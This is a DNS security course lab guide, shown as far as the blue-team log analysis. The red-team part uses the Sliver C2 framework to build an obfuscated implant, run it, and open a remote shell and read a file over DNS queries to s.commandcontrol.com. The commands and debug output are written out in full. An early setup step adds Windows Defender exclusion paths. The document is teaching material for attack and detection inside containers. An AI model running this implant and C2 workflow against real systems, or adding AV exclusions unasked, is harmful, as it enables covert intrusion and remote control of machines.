# DNS security lab: a command channel hidden in DNS

In this lab you act first as an attacker who controls an infected machine through DNS queries, then as the defender who finds that traffic in the logs and blocks it. For students of the DNS course. Updated November 2026.

**Before you start:** do the attacker part (red team) after the course's security slides. Do the defender part (blue team) after the detection slides on DNS firewalls and DNS heuristics, which explain the indicators it uses. Leave the lab running between the two parts, or the implant session is lost.

**Safety:** the lab uses **Sliver**, a real command and control (C2) framework that attackers also use. Everything runs in containers on your computer, inside the lab's own networks. Never point it at another system. For your own experiments, [iodine](https://github.com/yarrick/iodine) provides DNS tunnelling without that connotation.

**Teachers and maintainers:** troubleshooting, versions and design choices are in the [maintainer notes](MAINTAINERS.md).

## Contents

- [Prepare your computer](#prepare-your-computer)
- [What the lab contains](#what-the-lab-contains)
- [Check that the lab works](#check-that-the-lab-works)
- [Learn the C2 vocabulary](#learn-the-c2-vocabulary)
- [Red team: control a machine through DNS](#red-team-control-a-machine-through-dns)
- [Blue team: detect and block the channel](#blue-team-detect-and-block-the-channel)
- [What you have learned](#what-you-have-learned)
- [Go further](#go-further)
- [References](#references)

## Prepare your computer

You need Docker and the lab files. These steps are for Windows with MobaXterm. On Linux or macOS, install Docker, then start at step 4.

1. **Install Docker Desktop.** Create a Docker Hub account when it asks. This matters: without an account, some images cannot be downloaded.
   - During installation, choose **Hyper-V** and **untick** the **WSL2** option.
   - After installation, **reboot** your computer.

2. **Stop the antivirus from flagging the lab files.** The lab contains attack tools, so add an exclusion path. Open **PowerShell** as an administrator and run:

   ```powershell
   # If you have MobaXterm installed:
   Add-MpPreference -ExclusionPath "C:\Users\admin\AppData\Roaming\MobaXterm"

   # If you're using the portable version of MobaXterm:
   Add-MpPreference -ExclusionPath "C:\Users\admin\AppData\Local\Temp\Mxt243"
   ```

   The path of the portable version may change between versions of MobaXterm.

3. **Install make, unzip and git** in MobaXterm:

   ```bash
   apt install make unzip git
   ```

4. **Download the lab:**

   ```bash
   git clone https://github.com/jmanteau/dns-course-labs.git
   ```

5. **Go to the lab folder:**

   ```bash
   cd dns-course-labs/dns-cyber-lab
   ```

6. **Start the lab:**

   ```bash
   make up
   ```

If something goes wrong on Windows:

- **Docker Desktop asks to share files.** Accept, then run `make up` again. You may have to repeat this a few times.
- **A `make ..._shell` command fails.** Run the Docker command printed at the top of the error message instead. Or put `winpty` in front of the make command, for example `winpty make c2_server_shell` instead of `make c2_server_shell`.

## What the lab contains

![Diagram of the lab. Internal network: an internal client generating DNS requests, the internal DNS resolver and the internal workstation. A firewall separates it from the external network, which holds an external DNS server simulating the Internet's DNS and the Sliver C2 server. The only flow the firewall allows is DNS from the internal resolver to the external DNS server, and the external DNS server sends the queries for s.commandcontrol.com on to the C2 server. The red team student uses the internal workstation and Sliver; the blue team student uses the internal DNS resolver and the firewall.](README.assets/lab-overview.png)

The diagram shows two networks separated by a firewall:

- **Internal network**: an internal client that keeps generating DNS requests, the internal DNS resolver, and the internal workstation (the target).
- **External network**: an external DNS server that plays the Internet's DNS, and the Sliver C2 server.
- **Firewall**: the only flow allowed is DNS, from the internal resolver to the external DNS server. Queries for `s.commandcontrol.com` reach the C2 server through that path, so DNS is the attacker's only way out.

As the red team, you use the internal workstation and Sliver. As the blue team, you use the internal DNS resolver and the firewall.

The lab also starts a step-by-step guide in your browser, at http://localhost:8085. It follows the same steps as this page, plus a bonus step on DNS data infiltration.

## Check that the lab works

Before you start, check that the containers run and that DNS resolution works.

1. Open a shell on the client:

   ```bash
   make client_shell
   ```

2. Resolve a name:

   ```bash
   dig google.com
   ```

   You should see a successful answer, with an ANSWER section that holds an IP address:

   ```
   ;; ANSWER SECTION:
   google.com.        300    IN    A    142.250.X.X
   ```

   If the query fails:
   - Check that all containers are running: `make ps`
   - Read the logs of the internal DNS server: `docker compose logs dns_internal`
   - Read the logs of the public DNS server: `docker compose logs dns_public`
   - Restart the lab: `make restart`

3. Leave the client shell:

   ```bash
   exit
   ```

When DNS resolution works, go on to the red team part.

## Learn the C2 vocabulary

A command and control (C2) framework lets an attacker control infected machines from a server. These terms come back in the rest of the lab:

| Term | Meaning |
|------|---------|
| Implant | Software placed on a target system to keep access to it. It acts like an agent and lets the attacker control the system remotely. |
| Beacon | The implant checks in with the C2 server at intervals to get instructions. The intervals are often randomised to avoid detection. |
| Jitter | The random delay added between beacons, so the traffic pattern is harder to predict. |
| Staged payload | A small first payload (stage 0) downloads larger ones. This keeps the first footprint small and can evade detection. |
| BOF (Beacon Object File) | A custom code module that extends the C2 framework through its APIs, to perform a specific task. |
| Communications | How the implant and the C2 server exchange data. Common channels are DNS, HTTPS and mutual TLS (mTLS). Some frameworks use legitimate services such as Discord or Slack to blend in with normal traffic. |

## Red team: control a machine through DNS

In this part you are the attacker. You will see how DNS can carry a hidden communication channel.

### Step 1: Start the Sliver client

1. Open a shell on the C2 server:

   ```bash
   make c2_server_shell
   ```

2. Start the Sliver client by typing `sliver`. You should see the Sliver banner:

   ```bash
   # sliver
   Connecting to localhost:31337 ...

       ███████╗██╗     ██╗██╗   ██╗███████╗██████╗
       ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗
       ███████╗██║     ██║██║   ██║█████╗  ██████╔╝
       ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗
       ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║
       ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝

   All hackers gain first strike
   [*] Server v1.5.42 - 85b0e870d05ec47184958dbcb871ddee2eb9e3df
   [*] Welcome to the sliver shell, please type 'help' for options

   [*] Check for updates with the 'update' command

   sliver >
   ```

### Step 2: Start a DNS listener

To communicate over DNS, start a DNS listener on the attacker's domain, given as a fully qualified domain name (FQDN):

```bash
sliver > dns --domains s.commandcontrol.com   --lport 53 -D -c

[*] Starting DNS listener with parent domain(s) [s.commandcontrol.com.] ...

[*] Successfully started job #1
```

What the options do:

- `--domains s.commandcontrol.com`: the domain used for DNS communication.
- `--lport 53`: the listening port, 53, the standard DNS port.
- `-D -c`: work around issues of a recent Sliver release (see [Sliver issue 1714](https://github.com/BishopFox/sliver/issues/1714#issuecomment-2437165100)).

### Step 3: Generate the implant

Create the implant, the program that will run on the target machine:

```bash
sliver > generate --dns s.commandcontrol.com --os linux --save /shared-data --debug --reconnect 1

[*] Generating new linux/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 24s
[*] Implant saved to /root/sliver/TENDER_HOSPITAL
```

What the options do:

- `--dns s.commandcontrol.com`: the DNS domain the implant talks to.
- `--os linux`: build a Linux program.
- `--save /shared-data`: save the implant in the folder shared with the client.
- `--debug`: print debug information, so you can watch what the implant does. Used here for teaching.
- `--reconnect 1`: the reconnection interval.

Sliver gives the implant a random name, here `TENDER_HOSPITAL`. Note yours.

Once the implant runs on the target, it opens a hidden communication channel back to the attacker's server through DNS queries. The queries go to a domain the attacker controls, here `s.commandcontrol.com`. Through this channel, the attacker can send commands to the infected machine or take data out of it.

### Step 4: Transfer the implant

You could send the implant over DNS too, but it is slow. In this lab it is already in the shared folder, so there is nothing to do.

Optional challenge, after the lab: transfer it over DNS with a tool such as **DNSStager**.

### Step 5: Run the implant on the client

1. Open a shell on the client:

   ```bash
   make client_shell
   ```

2. Run the implant. Replace `TENDER_HOSPITAL` with the name of yours:

   ```bash
   / # /shared-data/TENDER_HOSPITAL
   2024/11/23 15:48:23 sliver.go:95: Hello my name is TENDER_HOSPITAL
   2024/11/23 15:48:23 limits.go:58: Limit checks completed
   2024/11/23 15:48:23 sliver.go:113: Running in session mode
   2024/11/23 15:48:23 session.go:64: Starting interactive session connection loop ...
   2024/11/23 15:48:23 transports.go:41: Starting c2 url generator () ...
   2024/11/23 15:48:23 transports.go:104: Return generator: (chan *url.URL)(0xc00007c6c0)
   2024/11/23 15:48:23 transports.go:92: Yield c2 uri = 'dns://s.commandcontrol.com'
   2024/11/23 15:48:23 transports.go:92: Yield c2 uri = 'dns://s.commandcontrol.com'
   2024/11/23 15:48:23 session.go:81: Next CC = dns://s.commandcontrol.com
   2024/11/23 15:48:23 session.go:81: Next CC = dns://s.commandcontrol.com
   2024/11/23 15:48:23 transports.go:92: Yield c2 uri = 'dns://s.commandcontrol.com'
   2024/11/23 15:48:23 session.go:171: Attempting to connect via DNS via parent: s.commandcontrol.com
   2024/11/23 15:48:23 dnsclient.go:150: DNS client connecting to 's.commandcontrol.com' (timeout: 5s) ...
   2024/11/23 15:48:23 dnsclient.go:295: [dns] found resolvers: [10.89.1.3]
   2024/11/23 15:48:23 crypto.go:199: TOTP Code: 52809890
   2024/11/23 15:48:23 dnsclient.go:713: [dns] Fetching dns session id via 'baakb4nb9w68.s.commandcontrol.com.' ...
   2024/11/23 15:48:23 resolver-generic.go:92: [dns] 10.89.1.3:53->A record of baakb4nb9w68.s.commandcontrol.com. ?
   2024/11/23 15:48:23 resolver-generic.go:175: [dns] rtt->10.89.1.3:53 10.042231ms (err: <nil>)
   2024/11/23 15:48:23 resolver-generic.go:109: [dns] answer (a): 1.162.116.21
   2024/11/23 15:48:23 dnsclient.go:734: [dns] dns session id: 7643649
   2024/11/23 15:48:23 dnsclient.go:810: [dns] Fingerprinting 1 resolver(s) ...
   2024/11/23 15:48:23 resolver-generic.go:92: [dns] 10.89.1.3:53->A record of 11awf08c3423e1f1fbyvwzpu.s.commandcontrol.com. ?
   2024/11/23 15:48:23 resolver-generic.go:175: [dns] rtt->10.89.1.3:53 3.180792ms (err: <nil>)
   2024/11/23 15:48:23 resolver-generic.go:109: [dns] answer (a): 92.10.10.78
   2024/11/23 15:48:23 resolver-generic.go:92: [dns] 10.89.1.3:53->A record of 11awf08c342ecvtvmqu41y67.s.commandcontrol.com. ?
   2024/11/23 15:48:23 resolver-generic.go:175: [dns] rtt->10.89.1.3:53 9.623392ms (err: <nil>)
   2024/11/23 15:48:23 resolver-generic.go:109: [dns] answer (a): 153.190.31.97
   2024/11/23 15:48:23 resolver-generic.go:92: [dns] 10.89.1.3:53->A record of 11awf08c3427qqre76jzxjyg.s.commandcontrol.com. ?
   2024/11/23 15:48:23 resolver-generic.go:175: [dns] rtt->10.89.1.3:53 3.844706ms (err: <nil>)
   2024/11/23 15:48:23 resolver-generic.go:109: [dns] answer (a): 25.33.165.86
   2024/11/23 15:48:23 resolver-generic.go:92: [dns] 10.89.1.3:53->A record of 11awf08c3426n8gqbd5er33g.s.commandcontrol.com. ?
   2024/11/23 15:48:23 resolver-generic.go:175: [dns] rtt->10.89.1.3:53 2.286681ms (err: <nil>)
   2024/11/23 15:48:23 resolver-generic.go:109: [dns] answer (a): 17.107.58.163
   2024/11/23 15:48:23 resolver-generic.go:92: [dns] 10.89.1.3:53->A record of TnY73vLSPNPEZfokxzwH.s.commandcontrol.com. ?
   2024/11/23 15:48:23 resolver-generic.go:175: [dns] rtt->10.89.1.3:53 2.259932ms (err: <nil>)
   2024/11/23 15:48:23 resolver-generic.go:109: [dns] answer (a): 208.211.228.44
   2024/11/23 15:48:23 resolver-generic.go:92: [dns] 10.89.1.3:53->A record of TnY73vLSPSJri3BywNN5.s.commandcontrol.com. ?
   2024/11/23 15:48:23 resolver-generic.go:175: [dns] rtt->10.89.1.3:53 2.637425ms (err: <nil>)
   2024/11/23 15:48:23 resolver-generic.go:109: [dns] answer (a): 19.118.128.142
   2024/11/23 15:48:23 resolver-generic.go:92: [dns] 10.89.1.3:53->A record of TnY73vLSPbsjY7F2GKS3.s.commandcontrol.com. ?
   2024/11/23 15:48:23 resolver-generic.go:175: [dns] rtt->10.89.1.3:53 2.579596ms (err: <nil>)
   2024/11/23 15:48:23 resolver-generic.go:109: [dns] answer (a): 239.28.240.5
   2024/11/23 15:48:23 resolver-generic.go:92: [dns] 10.89.1.3:53->A record of TnY73vLSPd6Zv4zcUidp.s.commandcontrol.com. ?
   2024/11/23 15:48:23 resolver-generic.go:175: [dns] rtt->10.89.1.3:53 3.515403ms (err: <nil>)
   2024/11/23 15:48:23 resolver-generic.go:109: [dns] answer (a): 152.37.160.128
   2024/11/23 15:48:23 dnsclient.go:830: [dns] 10.89.1.3:53: avg rtt 3.74099ms, base58: true, errors 0
   2024/11/23 15:48:23 dnsclient.go:649: [dns] encoded: 0, subdata space: 227 | stop: 103, len: 104
   2024/11/23 15:48:23 dnsclient.go:655: [dns] shave data [0:104] of 104
   2024/11/23 15:48:23 dnsclient.go:661: [dns] encoded length is 157 (max: 228)
   2024/11/23 15:48:23 dnsclient.go:690: [dns] subdata 0 (0->104): 104 bytes
   2024/11/23 15:48:23 dnsclient.go:693: [dns] original data: 104 bytes
   2024/11/23 15:48:23 dnsclient.go:694: [dns] total subdata: 104 bytes
   2024/11/23 15:48:23 resolver-generic.go:175: [dns] rtt->10.89.1.3:53 10.390112ms (err: <nil>)
   2024/11/23 15:48:23 resolver-generic.go:152: [dns] answer (txt): [pdrzTB7BJ5lUz4TEjJItw4Zc3LNNzPll6whAc0BojCcPpQsDS9ZGuiT8d6PE0CKTCl3enPt-DllzUfGM]
   2024/11/23 15:48:23 dnsclient.go:355: [dns] key exchange was successful!
   2024/11/23 15:48:23 dnsclient.go:359: [dns] starting worker(s) ...
   2024/11/23 15:48:23 session.go:179: Starting new session with id = &{[0xc0000a62d0] 0xc0000a0240 map[10.89.1.3:53:0xc0000ae200] .s.commandcontrol.com. 1000000000 3 5000000000 false  228 7643649 1 false 0xc0001ba390 0xc000070600 0xc000070660 [0xc00006eba0 0xc00006ebc0] 2 {} {} true}
   2024/11/23 15:48:23 dnsclient.go:235: [dns] starting worker #0
   2024/11/23 15:48:23 dnsclient.go:235: [dns] starting worker #0
   ```

   You should see debug logs showing the implant connecting back to the C2 server through DNS.

### Step 6: Control the client from the C2 server

1. Go back to the Sliver client on the C2 server.

2. List the sessions. A session appears when the implant connects:

   ```bash
   sliver > sessions
   ```

   Look at the **Health** column to find the active sessions:

   ```
    ID         Transport   Remote Address   Hostname       Username   Operating System   Health
   ========== =========== ================ ============== ========== ================== =========
    0661ad0f   dns         n/a              b6f487f2b837   root       linux/amd64        [DEAD]
    26b60830   dns         n/a              b6f487f2b837   root       linux/amd64        [DEAD]
    ff210e00   dns         n/a              b6f487f2b837   root       linux/amd64        [ALIVE]
   ```

   You may see several sessions, some marked `[DEAD]`. This is normal: DNS-based C2 connections are fragile and can drop. Use only the sessions marked `[ALIVE]`.

3. If every session is `[DEAD]`, restart the implant:
   1. In the client shell, press `Ctrl+C` to stop the implant.
   2. Run it again: `/shared-data/TENDER_HOSPITAL` (with your implant's name).
   3. Wait a few seconds for it to reconnect.
   4. Run `sessions` again in Sliver.

4. Select an `[ALIVE]` session with its full ID, for example `ff210e00-a7a0-4253-b9bf-0ac325cbea35`:

   ```bash
   sliver > use ff210e00-a7a0-4253-b9bf-0ac325cbea35

   [*] Active session AWKWARD_CURL (ff210e00-a7a0-4253-b9bf-0ac325cbea35)
   ```

   The short ID (its first 8 characters) works too.

5. Run a command on the client, without opening a full shell:

   ```bash
   sliver (AWKWARD_CURL) > cat /flag.txt
   ```

   You should see the contents of `flag.txt`:

   ```
   888888888888888888888888888888888888888888888888888888888888
   888888888888888888888888888888888888888888888888888888888888
   8888888888888888888888888P""  ""9888888888888888888888888888
   [... ASCII art flag ...]
   ```

6. Or open an interactive shell:

   ```bash
   sliver (AWKWARD_CURL) > shell
   ```

   - Sliver may warn you about OPSEC (operational security). Confirm to go on.
   - Press `Ctrl+C` to leave the remote shell.

7. From time to time, check that your session is still alive:

   ```bash
   sliver (AWKWARD_CURL) > sessions
   ```

   If it becomes `[DEAD]`, restart the implant on the client and use the new session.

8. When you are done, stop the implant: press `Ctrl+C` in the client shell.

### Step 7: Check the firewall rules

Check that the firewall lets only DNS traffic through.

1. Open a shell on the firewall:

   ```bash
   make firewall_shell
   ```

2. List the iptables rules:

   ```bash
   iptables -vL
   ```

   Only the DNS rules should show packet counts. This shows that all other traffic is blocked: the implant used DNS alone.

## Blue team: detect and block the channel

Now you are the defender. You will find the malicious DNS traffic and block it.

The lab generates normal traffic: the client keeps resolving names from the top 10,000 domains of [Cloudflare Radar](https://radar.cloudflare.com/). The Sliver implant's queries are hidden among them.

### Step 1: Read the DNS logs

1. Open a shell on the internal DNS server:

   ```bash
   make dns_internal_shell
   ```

2. Convert the binary logs to a readable format. `dnstap-read` turns them into YAML:

   ```bash
   dnstap-read -y /var/log/log.dnstap > /var/log/dnslog.txt
   ```

3. Look at the last entries:

   ```bash
   ❯ tail -n 42 dns_internal/var/log/dnslog.txt
   type: MESSAGE
   identity: 8465940cfe2f
   version: BIND 9.20.3
   message:
     type: CLIENT_RESPONSE
     response_time: !!timestamp 2024-11-24T13:46:27Z
     message_size: 46b
     socket_family: INET
     socket_protocol: UDP
     query_address: "10.89.1.4"
     response_address: "10.89.1.3"
     query_port: 45801
     response_port: 53
     response_message_data:
       opcode: QUERY
       status: NOERROR
       id: 8387
       flags: qr rd ra
       QUESTION: 1
       ANSWER: 1
       AUTHORITY: 0
       ADDITIONAL: 0
       QUESTION_SECTION:
         - 'brwsrfrm.com. IN A'
       ANSWER_SECTION:
         - 'brwsrfrm.com. 86400 IN A 108.121.79.28'
     response_message: |
       ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id:   8387
       ;; flags: qr rd ra    ; QUESTION: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0
       ;; QUESTION SECTION:
       ;brwsrfrm.com.			IN	A

       ;; ANSWER SECTION:
       brwsrfrm.com.		86400	IN	A	108.121.79.28
   ```

   Change the number of lines (`-n 42`) as you need.

### Step 2: Analyse the logs with a script

The script `analysis.py` looks for suspicious activity in the DNS logs.

1. Run it:

   ```bash
   python3 analysis.py
   ```

2. Read the output. For each domain, the script computes indicators such as entropy, character ratios and n-gram frequencies. It flags the domains whose score reaches a threshold. Sample output:

   ```
   [19:22:31] INFO     Parsing DNS logs from var/log/dnslog.txt                                                                                                                                                      analysis.py:313
   [19:22:49] INFO     Finished parsing DNS logs                                                                                                                                                                     analysis.py:342
              INFO     Starting analysis of domains                                                                                                                                                                  analysis.py:422
   Analyzing domains... ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
   [19:22:50] INFO     Finished analysis of domains                                                                                                                                                                  analysis.py:443
   ========================================
   SLD: public-trust.com.
   Score: 4.50 (Threshold: 4.5)
   Number of flagged domains: 1
   FQDNs under this SLD:
      - public-trust.com.
   Averaged indicators (* is flagged, average value (global average value) :
      entropy: 3.5069 (3.0721)
      non_letter_ratio: 0.0667 (0.0248)
      hex_char_ratio: 0.2000 (0.3017)
      vowel_ratio: 0.2667 (0.3348)*
      n_gram_2: 7.1429 (20.9079)*
      n_gram_3: 7.6923 (9.8561)
      gini_index: 0.9067 (0.8627)*
      classification_error: 0.8667 (0.7978)*
      number_of_labels: 2.0000 (2.2024)
      average_interval: 0.0000 (1.5459)*
      payload_size: 17.0000 (17.9644)
   ------------------------------
   ========================================
   SLD: 1024terabox.com.
   Score: 4.50 (Threshold: 4.5)
   Number of flagged domains: 1
   FQDNs under this SLD:
      - 1024terabox.com.
   Averaged indicators (* is flagged, average value (global average value) :
      entropy: 3.6645 (3.0721)
      non_letter_ratio: 0.2857 (0.0248)
      hex_char_ratio: 0.2857 (0.3017)
      vowel_ratio: 0.2857 (0.3348)*
      n_gram_2: 7.6923 (20.9079)*
      n_gram_3: 16.6667 (9.8561)
      gini_index: 0.9184 (0.8627)*
      classification_error: 0.8571 (0.7978)*
      number_of_labels: 2.0000 (2.2024)
      average_interval: 0.0000 (1.5459)*
      payload_size: 16.0000 (17.9644)
   ------------------------------
   ========================================
   SLD: 524131g7t.xyz.
   Score: 4.80 (Threshold: 4.5)
   Number of flagged domains: 1
   FQDNs under this SLD:
      - 524131g7t.xyz.
   Averaged indicators (* is flagged, average value (global average value) :
      entropy: 3.4183 (3.0721)
      non_letter_ratio: 0.5833 (0.0248)*
      hex_char_ratio: 0.0000 (0.3017)
      vowel_ratio: 0.0000 (0.3348)*
      n_gram_2: 0.0000 (20.9079)*
      n_gram_3: 0.0000 (9.8561)
      gini_index: 0.9028 (0.8627)*
      classification_error: 0.8333 (0.7978)
      number_of_labels: 2.0000 (2.2024)
      average_interval: 0.0000 (1.5459)*
      payload_size: 14.0000 (17.9644)
   ------------------------------
   ========================================
   SLD: choapuwtbvs.com.
   Score: 4.50 (Threshold: 4.5)
   Number of flagged domains: 1
   FQDNs under this SLD:
      - choapuwtbvs.com.
   Averaged indicators (* is flagged, average value (global average value) :
      entropy: 3.5216 (3.0721)
      non_letter_ratio: 0.0000 (0.0248)
      hex_char_ratio: 0.2857 (0.3017)
      vowel_ratio: 0.2857 (0.3348)*
      n_gram_2: 7.6923 (20.9079)*
      n_gram_3: 8.3333 (9.8561)
      gini_index: 0.9082 (0.8627)*
      classification_error: 0.8571 (0.7978)*
      number_of_labels: 2.0000 (2.2024)
      average_interval: 0.0000 (1.5459)*
      payload_size: 16.0000 (17.9644)
   ------------------------------
   ========================================
   SLD: site24x7.com.
   Score: 4.50 (Threshold: 4.5)
   Number of flagged domains: 1
   FQDNs under this SLD:
      - site24x7.com.
   Averaged indicators (* is flagged, average value (global average value) :
      entropy: 3.4594 (3.0721)
      non_letter_ratio: 0.2727 (0.0248)
      hex_char_ratio: 0.1818 (0.3017)
      vowel_ratio: 0.2727 (0.3348)*
      n_gram_2: 0.0000 (20.9079)*
      n_gram_3: 11.1111 (9.8561)
      gini_index: 0.9091 (0.8627)*
      classification_error: 0.9091 (0.7978)*
      number_of_labels: 2.0000 (2.2024)
      average_interval: 0.0000 (1.5459)*
      payload_size: 13.0000 (17.9644)
   ------------------------------
   ========================================
   SLD: terabox1024.com.
   Score: 4.50 (Threshold: 4.5)
   Number of flagged domains: 1
   FQDNs under this SLD:
      - terabox1024.com.
   Averaged indicators (* is flagged, average value (global average value) :
      entropy: 3.6645 (3.0721)
      non_letter_ratio: 0.2857 (0.0248)
      hex_char_ratio: 0.2857 (0.3017)
      vowel_ratio: 0.2857 (0.3348)*
      n_gram_2: 7.6923 (20.9079)*
      n_gram_3: 16.6667 (9.8561)
      gini_index: 0.9184 (0.8627)*
      classification_error: 0.8571 (0.7978)*
      number_of_labels: 2.0000 (2.2024)
      average_interval: 0.0000 (1.5459)*
      payload_size: 16.0000 (17.9644)
   ------------------------------
   ========================================
   SLD: commandcontrol.com.
   Score: 7.21 (Threshold: 4.5)
   Number of flagged domains: 73
   FQDNs under this SLD:
      - baakbyx0wa88.s.commandcontrol.com.
      - UYCkf2P1idG1KFkSoKVv.s.commandcontrol.com.
      - 1cwuqmad342jxy1pea9tjy89.s.commandcontrol.com.
      - 1cwuqmad342e9nbmfr8qq0h2.s.commandcontrol.com.
      - 6Ngv85FEMSXAquHiyZzdRWb.s.commandcontrol.com.
      - UYCkf2P1JLVniPmCmN6X.s.commandcontrol.com.
      - 1cwuqmad342bc1ak0mmn3znr.s.commandcontrol.com.
      - 3NNhTEvjhuigKuZWYu2Au1Gj835Y6LtwX5xQCVYFXetM7KokzUZbYRQhSXocvYF.DMHZoVWQpo5qQMCghT8km5ouFQDHekkVoLJriNC3NK9uQSLoUkEzGZNnAj5ycPW.Z5KJXga9rUhCZtU4Tio7jjU18Ya6WWQhMLh2iDgXKzy9Cc412zyFw5V1oLxMroc.9BXjoYykf1SzNoj9jMVysycKi2C7uqAdDaAPKuy.s.commandcontrol.com.
      - UYCkf2P1iyxi9gALCzmZ.s.commandcontrol.com.
      - 1cwuqmad342e7b5x1vnwh3yg.s.commandcontrol.com.
      - UYCkf2P1JekrA3T2CZbz.s.commandcontrol.com.
      - 3eHUAmw7uVKdY8RKWUdkBnwmVEayS3jUhJng2zycdFxSeegmB1rxMsQ9nta54mh.2FJPkqxdAg7nmkCF1kEfUyobMQB59aoffGjjQdcde4tPe24QxHETiG6eUEk65Hh.gH4GHNuFp5K3FBbe8MEPhNDqCCma3gr.s.commandcontrol.com.
      - H2Ev7q29w8mdSGMxJ8agimd7y7NVGHUW5eBJ3aUAJZZDhRsVTyFwpSVHCR2BDHw.n8uHpZJcULTPA7HsJpUjUbwAHswBwAyGqKPSkN2G6FWT2qnBdrn1fUQCJX74v5b.HbhvCNjj9aEBGsFF56vXuDTTEmZhf28MvbGPmmJxa8kZMy5B8QY.s.commandcontrol.com.
      - 6Ngv85FEMSXAiddKfXkobJV.s.commandcontrol.com.
      - 6Ngv85FEMSXAoSNcTWU2Hsg.s.commandcontrol.com.
      - 6Ngv85FEMSXb3qrgoubRJEv.s.commandcontrol.com.
      - 6Ngv85FEMSXAm9k411KUYQp.s.commandcontrol.com.
      - 1seJSpeF2h5ETxxgjj3AfkFjegAexPrN5zyLBPfG4d6RFtfczcdnYNY2bSFmKDA.WW1RqKCdZMqEN5MvYoiwUqbhHCtzNCx29UVr4uKYXqZoiLtRT1cbmEtt7wniTx8.j.s.commandcontrol.com.
      - 1NudDmC46z1nMipQpF2GSFCZ1DvUxqSt4UfZjwb4ZJUdQZFsz5DnQiVgMvuGxDL.rPZF6aqD97CJggMgUWptzdvDPUZ5zzMGMFco9GnePVTnzK24A2rZhHJkBCaLdY7.ZzhXwe4mGNCx.s.commandcontrol.com.
      - backbyhgt839ba8b.s.commandcontrol.com.
      - 6Ngv85FEMSXAyEXVnVvcHgs.s.commandcontrol.com.
      - 5Zetn7BHkeXJEzS1EkLXPtYXJbyaNNaS6FWc2yGViQARoW7xuiVnDLA2dpz9tYo.RiGD27u1LXUXo9gLq9ye57EnfimW7XD3yAKPiYFiyHyCh7rh79UG1d6nXNDAJ.s.commandcontrol.com.
      - backbyhgt859avr.s.commandcontrol.com.
      - backbyhgt879aw4.s.commandcontrol.com.
      - 4kMdLCzyk4aEtHv6GgwhMJxUmQ9utKQ4pJtSUbmYYM5Bbt12WyRVBHhtdC2q7tr.94aXdCYWWZX6HLmwJhavkPhXGSFEnEzTtzGJqg5AiRFbd1EM5aHFMs6F7.s.commandcontrol.com.
      - 4kMdLCzymkfon3zjXu86CfQ17RpJS4nLsgwdvaAXovBVv3KevADjmsAYM3F9Jgv.PQCWMNTs11d7oMFpMhesEgUtTbPcFwEX8eRy9kgzpdV9Qacih49Q6HenG.s.commandcontrol.com.
      - 6Ngv85FEMSXb4xnq54rSqkT.s.commandcontrol.com.
      - 6Ngv85FEMSXbg1uj8UjAxZB.s.commandcontrol.com.
      - backbyhgt899aw4.s.commandcontrol.com.
      - vu8NY269evX9FUZcsow748hyHGn8G5fzycJBvJixcj4F5UXTKL3pC5KKRSVifZx.KB3MdeHiPfdNYg9C2EAF7vhdRTKXzEWnovZwaBKwveg1gBGT3Tp98aEobyKNiTG.FHUkAxm.s.commandcontrol.com.
      - LpghHHXDLApz22utCaQYJ7zt5iLtmn3BdNCStwkubVPDGYDDgGajFifgu2QffYX.EDjx5CME8rX4RT5daqwjrZq681kcf8aQKbGHrP1ieuKPCmXQN6MFwxc6gxjE4vr.mTXXZ26VVbYxMJPvGvHGR85z8.s.commandcontrol.com.
      - 6Ngv85FEMSXb3MuE3hSdgc5.s.commandcontrol.com.
      - GnuEgwSD3UC8p8zWdYUo9MCipt7JkxYGRxhih11YJL3vZvb5zs8m3hNfpcPwV8V.iuifB6Fxw7XPbN1kyF5CpQYJ4kR6TThChWkho5rWCAd3fxFeM9HZyYGDMvPQLvy.77nwqiAuQEjNn8XVL3.s.commandcontrol.com.
      - 3NNhTEvjqRWxgJV72X6DqzVdSMLKkJdLD8XMSPUWY5cVzXP2gVLfPwFKwdu2BLi.igL8hHEU6wCzXziwFMoTiBJf5Pb9bJsJyWJv9bZxmYBA2ov42EjZD259EVFKKHL.UnxcijxhBuFV1pA1dRZxpMQkRF8mLAUaew5hhwZA3jtmEjK88UqVWjmNWsi5oUU.oo7AeXeYNrn6bvdedrJExbs2yPqSnqceMFH8vcH.s.commandcontrol.com.
      - backbyhgt8p9aw4.s.commandcontrol.com.
      - 6Ngv85FEMSXb11zqWjKRTfG.s.commandcontrol.com.
      - 4kMdLCzyvFBAerQXLi5Uz8VSuaYjFh7ZKz7HkgW8RtaqDPTMpP3McVqTMbrySk2.JFrdst5PBAqjk4HhTadrywdAbCktsdYRkH3VyMaaSiif5Tc5FVHGPaBUf.s.commandcontrol.com.
      - backbyhgt8u9aw4.s.commandcontrol.com.
      - 4kMdLCzytYGRM5M7u7Qfdnqgde7Rjtbgipxoea7RTQo3imxTghf2jsSnrNpPb9n.6zNems81ChmnEuboHc2wjwP2tZ2kh6BbnyemHkf7c5fWSqCJxfSgMd5qa.s.commandcontrol.com.
      - 6Ngv85FEMSXAwcsASaU5t8w.s.commandcontrol.com.
      - backbyhgt8y9aw4.s.commandcontrol.com.
      - 4kMdLCzywwGJ8CVHWRzuNzxr4VXd3ybj3QUecbz8spgr733o3Jm4yrZbAdGYUPj.7xS1iMRFL6bPUv9Yp26nFF8aaLmZqUmQzoVXb3ydyzBnc9Na5Kva8vADc.s.commandcontrol.com.
      - 6Ngv85FEMSXb6L6gXYxKLZP.s.commandcontrol.com.
      - 4kMdLCzyyEBt1NZvyeTkmVa45WQHP7FFMqnav9fvBJpPKXGvhpcZ3AHMDkBZsWm.D7pE9wSWP5KeWoBuR46EpesDEwBxfvuDG3q61DZw7mu1W93pxk9pQrSgE.s.commandcontrol.com.
      - 6Ngv85FEMSXbjRxmguTxdqu.s.commandcontrol.com.
      - backbyhgtk19aw4.s.commandcontrol.com.
      - backbyhgtk39aw4.s.commandcontrol.com.
      - HYN3PbtvJrNQaLKFv585TPgQ7rRegVpD3C4DPVbxxbRo4d6VeMGgfsUYXs7qwL6.KWb7p1dPcZXKiQjbbtpFEJdXx7ejMLAMhie2tPWnDx7R6Zb5v64T1arsG2.s.commandcontrol.com.
